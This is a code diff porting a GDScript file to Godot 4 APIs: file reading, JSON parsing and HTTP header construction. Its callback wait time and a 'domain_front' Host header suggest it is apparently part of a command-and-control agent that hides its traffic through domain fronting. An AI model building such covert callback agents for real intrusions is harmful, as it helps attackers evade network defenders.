@@ -12,13 +12,13 @@ var rng
 func _ready():
 	rng = RandomNumberGenerator.new()
 	rng.randomize()
-	
-	var file = File.new()
 
-	if file.file_exists(FILE_NAME):
-		file.open(FILE_NAME, File.READ)
+	if FileAccess.file_exists(FILE_NAME):
+		var file = FileAccess.open(FILE_NAME, FileAccess.READ)
 
-		var data = parse_json(file.get_as_text())
+		var test_json_conv = JSON.new()
+		test_json_conv.parse(file.get_as_text())
+		var data = test_json_conv.get_data()
 
 		file.close()
 
@@ -80,12 +80,12 @@ func get_callback_wait_time():
 	return wait_time
 
 func get_headers():
-	var headers = PoolStringArray()
+	var headers = PackedStringArray()
 
-	if setting.has("USER_AGENT") and not setting.get("USER_AGENT").empty():
+	if setting.has("USER_AGENT") and not setting.get("USER_AGENT").is_empty():
 		headers.append("User-Agent: %s" %  setting.get("USER_AGENT"))
 
-	if setting.has("domain_front") and not setting.get("domain_front").empty():
+	if setting.has("domain_front") and not setting.get("domain_front").is_empty():
 		headers.append("Host: %s" %  setting.get("domain_front"))
 
 	return headers
